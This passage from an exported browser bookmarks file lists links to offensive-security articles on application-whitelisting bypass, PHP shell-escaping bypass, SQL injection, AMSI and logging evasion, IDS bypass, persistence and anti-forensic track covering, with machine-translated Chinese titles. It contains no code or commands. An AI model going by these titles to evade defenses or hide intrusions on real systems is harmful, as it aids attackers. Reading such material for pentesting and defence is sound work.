icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA3klEQVQ4jWNkgIJ/aUz/GUgATLP+MTIwMDAwkqMZ2RBGcjXDAAuGSEQPA4NFAgMDhwBC7MIGBoYlKQwMXz5gugJDs0MBqmYGBgYGgwAGhow1WF2AaoBFAoK9IAGCf0BtVXFgYJAxIOAFmM1rChgYTixBiCcsQLiEgYGB4ckFuBRqIM74g9WZGCADYS8THmVEAcxYYGCAeGHPFFQxlxwGhpAJBAz48QESDiETMKMMpvkHqjiqAScWQKKRgQERcOjgBKo4qgErSiA0ekKC2XxiAUINFFCclCnPTDAOudkZAEkvQ+XgMBz1AAAAAElFTkSuQmCC" target="_blank" rel="noopener">subTee：WMIC.EXE白名单绕过 - 用样式，样式表黑客入侵</a><br>            <dt><a href="https://www.sec-consult.com/en/blog/2017/04/application-whitelisting-application/index.html" add_date="1524102849" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADKUlEQVQ4jY2TX0ybZRTGn/d9+wGlRSwd62wHEVDJgHRzyGQbc9FM480mW/ZVZbtwf1zCFVdmLIvyxsTMC6PGJZouMdsuiPJ9hsSVmM0ZCQGXxXQzENoApgyKCGbsT6R/KP2+93hhVnHzwufqnJMnzzkXvwP8h6SUHAA+/vKr/ecjP7Svnf0vEREDgDNfXBj5Zig6snb2sB5J1Q1DMMboyDvv7rZsa4fLXbaj/9rYbsYYSSkdD/sdUkre0NPDYJqI6zpJxmyiqHa+b+bUcjqHfGoZVf713UTRa4w9l5dS8lgsxnRdRzwef/QsymZrwr3G+6PjE4c9RWllWRZS9Dh/Nrjp4vE3Dr7HnM7kWj+7MDC0L1BVHVjJZuoCAX/19avfNSfGfqrt3DpnB9Q4B+OYo0YVHq0WG+uCCeZy3ZyZmZ11Op3Tvg3V846l3+f8uUzqc896H+4u/IbRGz/jw10TlmvxR5G2/95SIxL81PN7rNMjRXUtbW119Y1BVFb6YCurU3wf6Y/WPFN/M5dN753+dVo8VTyndhVfdtxfsaBpDFwwZCwGr7gtEiu1eVHZhC3bWjMA9Nd2bu7lumGIsx/0RPw+75tCOFLlJXkG21acAyACEYFzALalyktsblkq5S4t7nhl69OXDIMEN0MhW0rpOKofGCh3ameTmXUCpV6ucgRinMA42TkCSir4/KpP8JU/P2na8FhEDg46QiFmP+BAQUre1XnkykLWbUeWXlDeQICVMkUupmjdxip26c5L6o+M0w4dePmKlJJjaEgBwD9gSKmutr9VGTrcwS+Gw1bi3qt2q39JIyIMj3vyk/c9aHtxs+PMub4nPpJSQddFgcSGhh4GAJnU8qYMaWrbzu1a2tOifZ1sTZoLbcmKLQe1Q8ff1hbvppQgux4AdOgoXKDrUADgKnM3zc9Oi6lbycma2ic/Pd2xvR9l5eKXe97223eWuoLNLfXXhweDAGA2xgkmUCDRiMWK0onFvmRiKlqyWvTZyZPHltcS9+3IRJm7orRrZmqy+XLvuddN01z9F8LhcFjr7O72FJ5KN0Qh3KBCPTA85jlxIqw96P8CAdNcz+xyVFwAAAAASUVORK5CYII=" target="_blank" rel="noopener">滥用NVIDIA的node.js以绕过应用程序白名单| SEC咨询</a><br>            <dt><a href="https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html" add_date="1524802316" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACnklEQVQ4jT2SzUtUYRTGz3nvez/GmdEcZzTz2zFFCfGD0XSIyFoELRyCaDEQBEIQbYSohZsWLYL+gzatCtq4iNoUIVrkB6QROZpjNJCN46ClM87MnXvv+54Wd2pzVr/D85znOXj76WsiQkR3Gv6a/H5W2GVArKk/BUDlYkEKhzHFBTgAVGjGSMoPz59sL8/bpslU3npmqGPwbHJlITIZrw42CMcGAA4ARAREqm7MPrx7lE1P3n+k6gbjPLk49/LxDDKMXp+SUrgKDACIJNeN9NbXn+urY9du1nd0616f5vGMXL1x+c6MwjVAQEREBAAGACSl6vEkl+aRMbN4DECOZUlHHB9kOyPRQHObbZqubQBQIrE4ECBjtmUmF+cyW4nqhsbmvgHHtoRja3oV46o/ENK9fiKJiEokFgdEYduhtq5McuNgJ7W9tFAu5IOtYV8gaJVLgcYW3esjKdx4lEgs7pojIXqiE9lU8jCzs7u1vvn+rbCsk6f79CqfY5nImIspkVjcPV8KgYz1jF/01gQy3zfN/NFO4vNuct1XG6xtbBGOBciAqKJARFxVpRAkZVNvf8/4BcZ5JrmRy+5++/iuZ3zC468hIZAxJRKLk5SM8/z+HuNc4dwum5rh6R49H2oN/9r4YhULWpW3Y2jMNkvwrwdSdSO9tb69sqB5vEBEUub298Ij5yampgGgcPhb2g7A/x4QARARU2vLiqohY1IIACzlDpt6+wGAaxrXNCJZWUAAKYXhq/6xuvjp1QtVN3y1QX9dyFtbtzL7DADCw1G7XAmKAwAQIWK5eNw+MJpaW9pJrJ1oaLLMUuHPfja1fWX6QfvgaCl3yBRORJVvdWwr1NbVORxVdeNoL51YeGMVCx2DY5du3dMMTyl35NKI+BeX7UiNzOYAsgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Exploit/bypass PHP escapeshellarg/escapeshellcmd functions · security.szurek.pl</a><br>            <dt><a href="https://sqlwiki.netspi.com/" add_date="1524802324" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACd0lEQVQ4jW2STUhUcRTFf/f/niNBpZlkieSotYkanx+RtXgMAy0SsY2Yq4hqE1ZoiwgXRYvCTW0SrWjbRlqEaUhY2AQpOOKMRB9QNFFBpOGixI+Z924LZ2xG+u8u59x7z7nnD/958SqnLx503if2hCo2YomqutZE0JlPVIYiALKRMBN0+gXOASh8MrYfrv04+y3brKqPgAJgSdRvyRuQqAxFVMzzvInCtCrDmW2XgU3/IH6ZbDFbVeeGvsyOKwzktH/3jOm4WFY42Fnu96tyFvAyWAqR0wYgHqzr9VVfxoNOn5OMn18bIl89y4S7y9gtxotZGnjdvbMwqspJYElE2mo/zwxZM0HnpsCVjKSDP4p37gB6gKWuXfYfVJ4CmwRKfNHjI0V6rfk3y04yfg/ACLTlW5YWL2DZa5XvbvBcY6nZn8s3YvsRhU/rni2J2CtpV8C9HtjSqyLrN1HVc3d+pt4KNGcjFoDEnlAFaXM7bZke29d961EJDxcqi09dW1l8oGisb271sZ824wI12Yg3xlivYiYzOWd0660LZYE3Wz2iN+ZSo8DenJYP6zGGw2Hb9rwkyPscQgphHGDRsnyFsdyFCGMWgNvU2Kre6tRIkf3u6KpcNR7HgBIRaesqsSawuaviH5rRlTNu2pSD1CsM1CXjneI2NbYiZL+nB3py4Ovy6EogUH1pm0n6AXkBHMjsfFJduLm968uC63xOPAMQ93DjPLA9R9gS6P2MxibgUJ5slRPRyanBbGkjfjtqhlnLO4XSEZ2cHgIINzSU5ikQfRidiD3KPwPgHqmPoGYQ5XR0MjaUSwg3NJRqAWO+yOyridgpwM/F/wJMO/Ws4Cq9JwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">NetSPI SQL注入Wiki</a><br>            <dt><a href="http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/" add_date="1524889656" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACaklEQVQ4jTVSTWsTURS9976ZNzOZSdLa1JRWNwpRi6gguhL/g+LWlf/DXyDi1rXuXfpVURAspSpYqNVKW0xbDU0zGZN+zMx7714XSc/6cM7hnIMiIiIAgIgwhoAAixAiIIoIIo44AIDMPGIP8uLIWBCYiIJBYRigMLZRCSraFwA8UfQEAEVYpHdwHIfaiez0+sd5XtMkXnhoVEX7cKKPiIQAgGiZfUXTlahZiw8Phqvfv79dWPiX9mpRCACWmYgQQEQ8ESEi7Xmh7+XGlAKWGXyNcU2UevR+ebObnm9M3L8+P1uvKkJCxP5R/u5Xe6n9tz04tABJoCM2s5OTzVq8mWbb/4Zfd/cGRZkd54joIeLrH1tPPn5d38+e37lN1aA09g9F651+Gu/5gIO8XOukk1HoEY0j/c4Gjvnuldba+nowM9WcmZmePv0lK5Z2u63GRD3SzCAAhnns4BN93tieiKIHt+ZvXmwpz7sMcO/aBeOcItrcz3LrSusS7YsICHO7P/jwq/16baOTZsxsrTPWFsYYa0VkcWvnxuNne8NDEXHOeQBwKgri2elKoGlUN4oC8hQKgGO+1Jy6frY5yItGHI2X7h7l/V7vIOtfnZ9XihCxtK6XpkklqiYJgAzzEgCSQAMAoUio9TBLf/z8ORp/o5s+fLO4srr64uWrNMuYJQl0NQxGpyJBNNYeo5dMNVgEEZ8urnza+lOvRPv97Mu3FSJiZubxBT0WqWv/VFLJuuic9T21vN1RiK3z52bm5rTvl8YoIuesUgoR0TlHiMxclqWvNREttzsIcCakvCiISBHFcVyWZb1aDcPwP7ivaEFe4cH8AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Hexacorn | Blog</a><br>            <dt><a href="https://www.hackers-arise.com/single-post/2016/06/20/Covering-your-BASH-Shell-Tracks-AntiForensics" add_date="1525601719" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAHUlEQVQ4jWP8//8/IwMFgIkSzaMGjBowasBgMgAAZ6YDHjftVz8AAAAASUVORK5CYII=" target="_blank" rel="noopener">涵盖BASH Shell曲目 - 反取证| 黑客-出现</a><br>            <dt><a href="http://seclist.us/ids_bypass-intrussion-detection-system-bypass-tricks.html" add_date="1525681538" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADNklEQVQ4jV2Ty2tcVQDGf+ecO890ZjKZZNLOhFrTPBoSQS2xcVMXpRvxAZb8BYIiuijiVnAjiG6LuK6rJm5cCJYutAqK0hZp06hVzPs1mczcmblzX+fee1ylaL/17/etvk/wRBbfulUKdbAQy858uWpVpZBO+7B5fyR1584X792oWUauiNlu65i3HotLS2q6dfZya99933W4EGhVqNZLQlkWubzwu425Rz+s/Ja9OLW2cnR76GrlpdYWgAJYXFxSU9XS26dOp6/JOJlTwsoIJcVAOUMqlyIMtHWudm9Uxe3K5Ghjxumb9MIr/s3lZYwFMDgz+NpgJftx7DI4MjRKacij1ZEMDFs4fY0QMS/M3GdE/g2Ajsyr1X7hBvR+lPOL352MyXzgdNSg75YpjOSoTVvUJvKolMIkkLE8hksO02eOUBLiiDE/iK9e/4wBS+JePmgMPG+l8oxWBZHwEVpisNBRjEh8zo/vkcQGARgtMbGRcWzO+06mLgPPudjphdmeq+n2jjhsBvQd8HzwvJhiqsfC9CFJFGKMIHQFWhvixIggNFJqzx5zezb7+x3S+TSpXJquY+jYAX/c3cQ/XKdW2WO8fkgSSZy2IIwNG7uZ7F8b1ril3XaAiTBF8IM8/zzqkhgNRERhB2V1Mck2uXQfbSu6HYPOJCDicqkQDFuhZ6/G2ns9czpLY2ed/S0b7QeYOKJ8ok1S26TV3uFkQWNv5zEqIUoM+Uz0p1TxTzLyOzfDfqvpOU3yJ2LGZwpksj5J0kOlI2Ynt9jYaOHbCntXkRtKODgybDfUbbHKuiyp5s/E/a8LRRBCY0zI2ESFp86NMFw1mLhNveKx+yDPwJDhyEloHJkDJbn+0fdE8uHD5dB3e584tv1rr23jdnu4PQe/77K7m+D1Bdl2BhFJoiy0OsYvFc2nUcW793jKbne1lctP/GKi6KwOvDOh68nADQj6LvMjmlOqiy4m7DTZ63vhl5Err737YegAiP8+sV6/VBEquBJG3TfKlfIzl8az1amS0xRTlfWD/bVbzz198O2zM427ky8THDv/KzjOhQmK77w48aZuBbNfrcjPfy/OrW0++MYGzJPsv3XcsIGkT5C8AAAAAElFTkSuQmCC" target="_blank" rel="noopener">ids_bypass - 入侵检测系统旁路技巧。 - 安全列表网络™</a><br>            <dt><a href="https://ridicurious.com/2015/03/20/powershell-cmdlets/" add_date="1525924564" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADT0lEQVQ4jVWTTWhcZRiFz/t997s/c2cykzvTTBI1Jo1QowWtRQ1FdFEVBbVQEKSWVkHUpRsFF4oKrgr+UkRQBBdSdFF0I6ipWgSpIaU1RZIYU4yThDSZDJk7P5l77/e+LqKgZ3/O4jk8hN0QAImiqG8wqrycQZ4nq4upB9FsIb0Mrmc2EvB7iwuLpwCk/3bonwGMXz9+k8m5Z1jRwbyIDLgGa90OCr5BLkrwx2pMSheg2Pmx3W0/WavVVgCQBoCxsbGq63pTINpfSDrpM6ODdDiK6Bbj0n2DXXrhlTyG93ly/ty1zHNLex3t3AuFM51OJ9EAUK1U33WMuT/rxcmjkwVz+G6mnl2j0YmWHHq6hdLIMh04tIdWakpdvBwnubA44jku1xv1czQxPrFfOfiFxXjF4jY+Oe3j5vFESacrUDtELiPJuuIEEU1PB3ziuSa0vg6CdKvVbd3uWLKPGccNCmHJVspKhWEdSOsi1CEhgHouNAkpxBJFGoHvUrdnRWuqhEH4oMqH+YOlUr8EgY92O0Hc9iBGkzIBtFdGpoNd4EpR7ZqmnSSFMsQWmVixd6hyuVxRSoPAaLdIvvneEhVHMDMrOP9DHme/clHbdGBNFV+c7aKXGCISECkQUaS0NjERwdpUAr9KX36ek2+/yzC0bwAz0w3E9R0M3DiCjz/sYurrDnJBUSxnu98z6sq4+hIzE4uQIIPVIU6/syGplHHrpI8D91RxZbaI99/elCA3LFYYwqKYmRg8ox96+JGd1drKMQgc0QLlA40Gq3jLiB8a2o59+ezTJpaWicgviAUDChCSjSzJXiRpNssPHDn6lrVyIrVJwjoxRAny6KOR4bLEcZPml35HVxLJSIuInznacW2Wvb44t/iaQqFgjj9x/A3tqAXHGFeLmyJzWQc+s1cCe5GQXxQrIRNCa7RxOZOf40Z8CgCpubmV9OSzJ1t3Td75OLG65FK/qySv/1ybVU5pXvKDy9Jsr5JCn9bcb9hiKt3ZOrq+vt4GABIR2vxrc6hyQ8VeuPCrefWlN59aWf/tWMLbewHlMQugpKupOM9p6aPFqz99AID/Z6OIBGtrjT3OULY1QAOtahVhf//4bRYySkQMy0sLC1cvA+j9V38A+BuhtpWlXdgWXQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Powershell : Command your CMDLET&#39;s - Ridicurious</a><br>            <dt><a href="https://rastamouse.me/2018/03/a-view-of-persistence/" add_date="1526346116" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACvklEQVQ4jX2TT2hcVRTGf+fe++bNvElmJtaYEMSJkOpGcFsQJAtBobYiIm505cK94MaFjhZ0YXe6ibgzblQEowgikm4CEaFSFGlsUbF/xjpx0uRN5r157917ukgMVtQDBw7n8J0/38eB/7GhftXWS73WQHX673ld77m/YrmtoAgsWzinXD7zMVYfZryvNJdKNH2P1gMj3P3vSqe7858NRFD96Z01ZrJTfHcOrMDiCWg6sA3YSYdI8TYvv35GPsLLbcBez/DC4quM/nyFkHrUCOoFVeXHLzzFCGaXIh46BTfSNRZPPCsHawP0hEvmU8KVx+kPS9p3O52aFzFGQaH/PUzGosmMSlVMOFavsz16zR1Nfq6+xkx8kvPXJwx/izE1pDkL/R8EMZCPYLytMvpDyG5adp0nC7Eb6MVpLn+ySlNO0h+UNI/FxIky/IXw+0WRUByyJWCcCOh4cE2SKjEkC8HdufHGS8Tj01z4eaLYWKpMMQbFyPj6FrX2HLXOHMGXB7eKINZC8KBBHVe+hXYdxNli2CdUE+qzXQGlPtvFRDU0VEdyKUjjrkWlZYVR1TQkd7xFJl/SEAvqfT4WDRUigqk1MDY6AouxiBgwGCaaEfzXRp7YSCmrNWoicWfOJwvHEeOospTxtS2y7auHQht8tqvFzb7HYsirXXn6wudOV5daOHea3CtgjbWEUJEPrqpqwI9T1cp7iSxaeVwURwSgofP64YPPOOKpF2lHj7JTlmpwolqKGFwy7cj3xCUdkZm6QT2u04W9/T0iG2jOf0P+675DcZRVwEgkViFxkVhD3S6gfj4VqoKRX6HaK+guF9z3yAr5+5UcX81ASoeJpnENg6bb0PKkxQpTeUV+Y1PuuXeTrQ3kedIDGs8eOsAHaA+DfvbYk3r+zad0damlm73Wv721ri87XSHS9Z7TfzzgLW1KSlmaK8o8AAAAAElFTkSuQmCC" target="_blank" rel="noopener">持久观</a><br>            <dt><a href="http://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/" add_date="1526473399" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAaElEQVQ4jaWTOQ7AMAgEh4j/vxjJaUKzig8MpfGOx5c5DCYVYNkPMO07jGcW3lWCXVeshAHKBrrlEkDDAXYM+AuXDTT8gferrMZKBpO3sJ6ghi2DhLQACjkGqHpCWofoMK6usfUXFPwClhYgKOf1vFgAAAAASUVORK5CYII=" target="_blank" rel="noopener">Pentest提示和技巧＃2 - EK</a><br>            <dt><a href="https://sid-500.com/2018/04/02/powershell-how-to-get-a-list-of-all-installed-software-on-remote-computers/" add_date="1526805434" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACm0lEQVQ4jS2SuW4TURRA771vNs/YcWI7Mc5mEkUkEAXEIiERIQoo+AU6foIiINFQIAoKShBUCCQaEBTALwARi8jCkkAWjB0ntuNZPJ7xvHcpSH+OdIqDruszs1JKCLHx89vtm9eWV1aF0BIli4XBG7funL902W23AQARAFAsLFxHACFEIuWrxw+8zdW0ZQJLgdxqNT8tvhNEM8fmkAgAAABd12dWtpN+8+KZ//7theMzu82GH/iNtv+juvt6cdmV9Ojp8+nZE2EnQEQCACG0tudR/ffFU7N6Kl0qlsaLxdF8dqqYmz86kUTd+/fuxlFXCPFfYBKis98sZ3QSpKIOyyQOQ6kSZrAtsz9t//q+vFOtGIaJiBoiIlHk7WftlKlRD3tIYFm2HsUJuBqiYxpxEkedDhIxs4ZIwJAyjc2t35thMDc9tbW5sVapZxwnlmAahqVT3GNAQABEJEIEIouYAX81vUbt7+ellUhPfa/WNRWYhu5Y1pBBjdUvKAQAHCRB1x8fSI/1zfjNpmX0lQcyYxmTBMh6UMrnk9pWVNlIpEQAAgAkxjhJSey3UqEbGSiGDGPEycR+3JOYy2ZtoP7hMgoCAA0AgFHP5qWAMAzdMPA8LwoDk7Ba3WlRJmi1Dh85MnxmnpMEEDVABKn0Q+NeNh/UqqOTo0rEK/W9rAnNyPdRHxgsnb1ytVCe7EVdJCJEZCXRtHlwLAy7SLYSqSCMSNc7Urnufm60PHL8tFISiQ4EYCZkfWiiUMih30xzb3o41whCN+wFUcJKEqBS6oAEAEZgKe3SZK+v4BSc4lhpqdb6sP6nstcOg3ZtfcmtVxwnxUodvISArJRpO9bRczuJ8XG7tri2Xd1rp03t5HhhKC1ePnn45fNXwzSY+R+hmUtZ9yptOAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">PowerShell：如何获取远程计算机上安装的所有软件的列表 - SID-500.COM</a><br>            <dt><a href="https://thevivi.net/2018/05/23/a-data-hunting-overview/" add_date="1527124153" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABvUlEQVQ4jYWRy07bQBSG/zNjj+04NwghIlBR0bCKVEV9gLwBCxZd9DX6NH2Jqg/BrrsuUFUkukhLaUjIzbHjjD1zuiCCNGnFWf2L80n/Bfj7BJ45uabJCSrGq3lhkWxuTf4MIFRYqVa7LRNR3fgNV7lWx2z5v4CjAhHsvD3uve+OmPnr/EiWmo5fYhJkMmazZcnmXu3lj3vbUvPuq6Tb7Kc5+Z4quHaeuWYZbwLMHBQrXGgE0c9aUbYPZdXce4uhFkFvpkwarYysWfLJrzac0W6Iy1v+cLHUlq6Xe+qgg+wzwJsAeZWd5fUxjT/dFG7jpN3ELIZLBcnm8RsAPSpVqu8f7Pd75SwNBf1WDqfZEOio6qQQDic33x+wp6FMOjduWXoVwhvL7TTzgfPTOt51Lg37QspNS8xWx8N0WiKEwMnZ64+W7y6uWt+GNceVzLxVK0Rx7xDk6sURqD9OxK9pc5R4d6YY+FEyHmyFJjK5tYaAK7AeRKdADJy45ovJNUAPGZ4AENLZOEv93Rc6026+GJAga2OL6TKO/9ESQG5Q8kJfqjIRkyAiyax1kqbRxOjFNrBKAliAVgUSwHZ9hz9GOcp2qhl3kQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">数据搜索概述 - VIVI</a><br>            <dt><a href="https://www.peerlyst.com/posts/wmi-wiki-for-offense-and-defense-s-delano?utm_campaign=peerlyst_shared_post&utm_content=peerlyst_post&utm_medium=social&utm_source=twitter" add_date="1527731063" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACOUlEQVQ4jWPcFykhwMHEAAMffvyDcJm5+DhltV/cvszz7wuyLIsABxNcEQMDgwAHE7O2m1JwIaesNgMDgxIDw/fXj1+ubvp0fidUNt2Ql4OF8cOPfxwsjAwMDOJ+hYrx7az8YtfPHNm+esmXTx+U9EwFTP2+8kj9urKbgYGB8VyiFNw6GX1rpZKVP798zIvwvHHlooYwm4ogC4OkVubUTTx8/IsrY/XfHES4XoCDid8xkYGBoSot4tmtyxUWAtFa3O6KnO4c969OSGZgYFBwDLvy+hfThx//EHo0rb59/njxxOFEPV5pXmaI9xgYGDgfn/r26rGtm++hxz+Z4KKQkPny6SMzI4OKIAvcWogs489PDAwMd97/ZkIW/XLzuJi0nL6+AYq1HEw/eKQ5ZbUf3bzMwMDAhGzS+2NrGBgYdOy9vv7+j2ytbtEcBgaGrauXSPEysyCb9O33fwYGBmVNXTmHVZyvbzw7tUNc10rQKpRNWObRzcsr5kwJ1eBmhMe0uF+huG8hAwPDl08fefj4GZDA1kXTZve18v3/kqLHC41p3cx+QatQiOr8CI+vrx6rm9gqa+revX75xpWLb589spPlcFfi42RhZGFgYICrZmBgmN5S/urOlRhtHoWfR+7u38/z5a+/CDOPJJ+CANTxLCIuyXDV3WUZO9csidTi1hRh/fDjn44om44oeqJk+vX2CVz1llWLI7W4TSXZkcMaPUL2RUr8ljfbdu/7xROHI7W4VQVZsaZ2OBcAsL/tmnRTUlEAAAAASUVORK5CYII=" target="_blank" rel="noopener">WMI wiki for offense and defense by S. Delano - tools, enable, operations | Peerlyst</a><br>            <dt><a href="https://pentester.land/list-of-bug-bounty-writeups.html" add_date="1528903494" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABbklEQVQ4jc3TPWtUQRTG8d/clw3sBmIQy1SW6awtbET8APkGNmKbl/Z2kQSxsBHtbCy2shQb0c7CRlCC2FgZQgphc43ZvfdYXLK7kS0UG59mYJjzP8+ZeYb/VlHJ/uRcmhbsG+hLjkxS5fQC6Iq+e04S8TsgmxaHj346suwwHvoQe+6AgRtqX+26ushBZ/NEKKxpvMGW1qFlT2PPNY2J3KrQg4iZ6xngWCMHr9OmJw7c1hhLrsuMhEALKV0cowCXnW+vxn0rCneVSrVPMktCknedI6R5SOegVhobyW3KfVPYVXucdrwSVoRWI0V36efrnIO+RmZJ46XwzJmDtO393FuF0o9EWDjCscYlPeFt2vIcYkOehhqtkCRj6/FAaayUTOz4nGiLuS4wiA25dTkmhsiEXIYXQqOn0PiusqYy6gCPnNl3E1/SUBND7TQ0tXf6biGThFamdYp6US7+WrMoVzKVWBTXRf8iVV0u/lm/AIlnhjDPYcMeAAAAAElFTkSuQmCC" target="_blank" rel="noopener">错误赏金书写列表·Pentester Land</a><br>            <dt><a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" add_date="1529329683" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAB1UlEQVQ4jXWSTWsTURSG33PunUySZmzHxhQqFhmbEqViCVS6UDci6s6NuPcPuHQvrvwF7rvvViiCOxEKdVcXltKFUdKakthkkvm497hop5lIPLsD54H3ee8F8kOkmAF9vqBApBmUP1ETAJNYcVRxtX5lLfDJmk44JIbI/wDhW0vzm+8evXreePFsxdEz258PWLFYmQqQo/j9m8f37swO4tRE0lj2dvfah61TyoXiLDwAaTaqzZuz3Z6Y1BHHqXmlzbdP1tcWRHDB6Cw8jKB+wy+6Eov+3el++PjDr3ir9drV6uUdtIlIRMaAEAEy55VcrcMorS54W9sHX78dlV09jCwAm2lkkc6FtIJrLBVL9Ppls0AURhac6+hCmohEsBzMPdxYNGYURfp24Hte+dPOLxIS2H+lz/Lt73fCoWZSRGYUDzfuLjnKWkknnioDAGDve/dn+4/SRUiq+FLvqG8TCzhTgDMH33cqFW2NECgyg+C6X5t3gWQKwEwAnj5YCRaLxsbiupGk12r6/noAgHkMZLUCALphcnw66oehistkuDdCfxABjJx0BogAaLU6X3aPk8Sw7ac6Vigftk9AJOP7ia9LXqU046pEBDAsVCB1EiXDMEWuqL+u1MVGV/bvoAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">探索PowerShell AMSI和记录逃避 - MDSec</a><br>            <dt><a href="https://legend.octopuslabs.io/" add_date="1530000729" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADI0lEQVQ4jXWTMUijdwDFf98/XypRc6lJkIT0jF4MCdImEoxToQiCokM7OOh80FHwCjVDhwwd4tCC60EXKTRZpN1KK+KJW2ysOdAvJv1MVLg26uepiYl+Sf5dHK6lfdt7vPeWx1P4F1ZWVkJSys+BT4DRR/l34JWiKC+Xl5cL7/qVd0kqlXohhPgqGAzmo9HoE1VVhwBardbx/v7+TbFYjHQ6na8TicS3/yhIJpPv2Wy2n+x2+7O5uTlRLBaHC4UC1WoV0zTxeDxEo1ECgUAxk8nI29tbvdFofJpMJh8sANPT09+4XK4P5+fnB9bX170HBwfUajWklAghuLu7Q9d12u22a2Fhofvw8PDeNM3AxsbGL0oqlfpICPFqcXHxr62trXCr1eLo6Ijh4WGEEADU63XK5TJLS0tYrVYeHh5OV1dXe1ut1scCeB4Oh/eEEOGpqSlCoRCqqgIwMzPD7OwsiqKgqipv/nwDQLPRePqYeS6A6Vgs5tjc3ASgq6sLKSW6rqPrOgA2mw2LxcJvuzkATk5OicViDmBaAEMej2eoXC5jGAZer5eenh5UVaVYLCKlZGRkBLPZ5O3VFQClP0q43e5ngE88zqRYrVYKhQIWi4VQKISUEpfLBYDf76fbbqfX3svl5SXVahVFUQAsAji5uLjQ3W435XIZKSXBYJBmvY7dbmd7exshBD6fD6/Xy97eHu12m/Pzcx04EVLKn3O53HUgEMA0Tc7Ozujv7+dZMEipVGJnZwcFGB0dZXBwkN3dXcLhMLlc7hr4VSiK8lLTtKjf7z9yuVxUKhUAJicnOT4+xjAMavU6A08HuKvX6evrY2xsrKBpWhT4TiQSidftdvuHdDpdm5iYqN3c3GCaJoqi0Gw2cTgcaJqGooBxdcX8/Hwtk8nUO53O94lE4rUAuL+//8IwjOra2trp+Ph4SUpJtVrF6XTi8/loNBqgKAQCgVI6na4YhlFtNptf/u+ZwuHwfiQSeeL3+wcBKpVKOZ/P32iaFv2vM3UDvcD7QF88Ho/E4/HPnE5n5Pr6+gMAh8NxZhhGPpvN/pjNZvPAFfAWqP0NkFlzIkvmn10AAAAASUVORK5CYII=" target="_blank" rel="noopener">https://legend.octopuslabs.io/feed</a><br>            <dt><a href="https://blogs.msdn.microsoft.com/aaron_margosis/2018/06/26/announcing-application-whitelisting-with-aaronlocker/" add_date="1530001826" target="_blank" rel="noopener">宣布：使用“AaronLocker”应用程序白名单 - Aaron Margosis&#39;Non-Admin，App-Compat和Sysinternals WebLog</a><br>            <dt><a href="https://rayanfam.com/" add_date="1533785844" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACZUlEQVQ4jV1Tz2vcdRB9b+bz2bQb45IGgikFIw3peTeBKLSCvXjo2VwVAyJY8OKld8Wrp1YQ8S9o/4NiVPSY5NbbnjbqXhLJtm62389nnofshqxzmjm8eT+GIS6KAAQAvV7vXQCfkrwv6RYAkBwA+LnW+tPR0dEfVzGcDtjY2FjodDrfAHhIciEiMFsKgGYGSa8BPBkOh48Gg8EYAByAra+vLywvLz91949rrQagTBlmBJJUJCV3f6/dbm+TfDYajaoBiJWVla/d/UHTNBOSAJCugGdyE0mUUiYppQ/X1ta+BRDsdrvbZva7JBNkBOeAJCFpZgWSRDJIqmma943kZyRbCAEFlM2xagrmTI+ZzQiyu39uJO9HDUWLpiXCzgRIFCToModZD0mQZFMlH1hE3FIV0AJf7jpePXBAFCsoak7NnK+L+eaF4ATZSHjzhwISOPnKEUsEg4ARnItlvszMBgQpQuUdoqwS1w/AeFl0PjnHZHyO8XisUsrlllkuJP9KAPYt7HbpRB3fc7/+WyC9KFp8q8Mbb99QrRXuzpOTE52dncHdQTLMLEXEvq+urv5tyT7ha/DaoZj+If/1c3R7Xex+tMvNzU3u7Ozo9PRU/X7fWq2Wpv4jIh4SAHq93nfJ05dNbSYAMkHWWtE0zaXXnDPcXZKanPNCKeXxwcHBFw7ASP6y+MbidkrpTtQQgGpmzDkz54ycs0iGJKaUcq31eSllbzgcVgeg0WjUuPvTdru9RHLLzLIk/i9sI1ki4vvj4+O9fr//Cle+8fLOW1tbdyXtTd/55vTufwLYj4gfDw8Pf72K+Q8/rTFsfZZWDgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">新浪和Shahriar的博客 - 一个积极的无序博客……</a><br>            <dt><a href="https://darrenliuwei.com/%E5%85%8D%E8%B4%B9ss-ssr%E5%88%86%E4%BA%AB.html" add_date="1535770857" 